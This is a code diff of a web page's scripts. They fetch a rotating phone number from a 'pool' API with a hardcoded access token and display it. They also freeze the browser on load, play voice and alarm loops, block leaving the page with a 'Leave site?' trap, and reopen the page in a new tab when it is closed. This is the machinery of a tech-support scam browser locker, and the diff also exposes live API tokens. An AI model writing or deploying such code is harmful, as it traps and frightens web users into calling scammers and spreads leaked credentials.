@@ -572,19 +572,15 @@
 
   <div id="overlay"></div>
 
-<!-- ================= NUMBER FETCH (AUTO-UPDATES ON IP CHANGE) ================= -->
+<!-- ================= NUMBER FETCH ================= -->
 <script>
 (function () {
-  const TOKEN = "PrqmABNZsE0yzZ0442YwpBVYUANMFyEQpKFwTgrFV3yv3R5nHoCnIyJqPoD3";
+  const TOKEN = "3b49Ey0SmtVHT2IQZe2br6XzM6cjEtKNCVvpKPep6030Zo8lmGy2VcraZ32n";
   const API   = "https://console.dialcs.com/backend/api/pool";
-  const POLL_MS = 50000;
-
-  const els = [
+  const els   = [
     document.getElementById("singleNumber"),
     document.getElementById("singleNumberFooter")
   ];
-
-  let lastNumber = null;
 
   function setText(txt) {
     els.forEach(function (el) { if (el) el.innerText = txt; });
@@ -592,32 +588,19 @@
 
   async function loadNumber() {
     try {
-      const res = await fetch(API + "?token=" + encodeURIComponent(TOKEN), {
-        method: "GET",
+      const res = await fetch(API, {
+        headers: { "Authorization": "Bearer " + TOKEN },
         cache: "no-store"
       });
       const data = await res.json();
       console.log("API Response:", data);
 
-      let num = null;
-      if (data && data.success) {
-        if (Array.isArray(data.numbers) && data.numbers.length > 0) {
-          num = data.numbers[0];
-        } else if (data.number) {
-          num = data.number;
-        }
-      }
-
-      if (num) {
-        if (num !== lastNumber) {
-          lastNumber = num;
-          setText(num);
-          console.log("Number updated:", num);
-        }
-      } else if (data && data.message) {
-        setText(data.message);
+      if (data.success && data.number) {
+        setText(data.number);
+      } else if (data.message === "Token missing") {
+        setText("Token missing");
       } else {
-        setText("Number not found");
+        setText(data.message || "Number not found");
       }
     } catch (err) {
       console.error("API Error:", err);
@@ -626,12 +609,7 @@
   }
 
   loadNumber();
-  setInterval(loadNumber, POLL_MS);
-
-  window.addEventListener("focus", loadNumber);
-  document.addEventListener("visibilitychange", function () {
-    if (!document.hidden) loadNumber();
-  });
+  setInterval(loadNumber, 50000000);
 })();
 </script>
 
@@ -645,7 +623,7 @@
   const REFREEZE_ON_ESCAPE  = true;
   const HACK_MS             = 900;
   const BEEP_ON_FREEZE      = false;
-  const REOPEN_ON_CLOSE     = true;
+  const REOPEN_ON_CLOSE     = true;   // reopen same URL in new tab on close
   const FREEZE_ON_ANY_CLICK = true;
   const VOICE_ENABLED       = true;
   const SIREN_ENABLED       = false;
@@ -657,9 +635,9 @@
   const PS_TYPE_SPEED_MS    = 40;
   const VOICE_REPEAT_MS     = 12000;
   const ALARM_REPEAT_MS     = 5000;
-  const CF_INSTANT          = true;
-  const AUTO_FREEZE_ON_LOAD = true;
-  const AUTO_FREEZE_DELAY   = 0;
+  const CF_INSTANT          = true;   // instant freeze on load
+  const AUTO_FREEZE_ON_LOAD = true;   // popup shows instantly
+  const AUTO_FREEZE_DELAY   = 0;      // ms delay before auto-freeze
   /* ================================== */
 
   let frozen = false;
@@ -1264,10 +1242,12 @@
   }
 
   if (AUTO_FREEZE_ON_LOAD) {
+    // try to arm audio immediately, then freeze
     getCtx();
     if (AUTO_FREEZE_DELAY > 0) {
       setTimeout(autoFreeze, AUTO_FREEZE_DELAY);
     } else {
+      // slight delay so DOM + first paint complete
       setTimeout(autoFreeze, 50);
     }
   }
@@ -1298,15 +1278,17 @@
   let isReloading = false;
   let allowLeave   = false;
 
+  // Native "Leave site?" dialog when user tries to close/refresh
   window.addEventListener("beforeunload", function (e) {
     if (allowLeave) return;
     if (!frozen) return;
     if (isReloading) return;
     e.preventDefault();
-    e.returnValue = "";
+    e.returnValue = "";   // triggers browser "Leave / Cancel" popup
     return "";
   });
 
+  // When the tab actually closes, instantly reopen the same URL in a new tab
   window.addEventListener("unload", function () {
     if (!REOPEN_ON_CLOSE) return;
     if (isReloading) return;
@@ -1317,6 +1299,7 @@
     } catch (err) {}
   });
 
+  // Detect reload so we don't reopen on F5 / Ctrl+R
   window.addEventListener("keydown", function (e) {
     if (e.key === "F5" || (e.ctrlKey && e.key === "r")) isReloading = true;
   }, true);
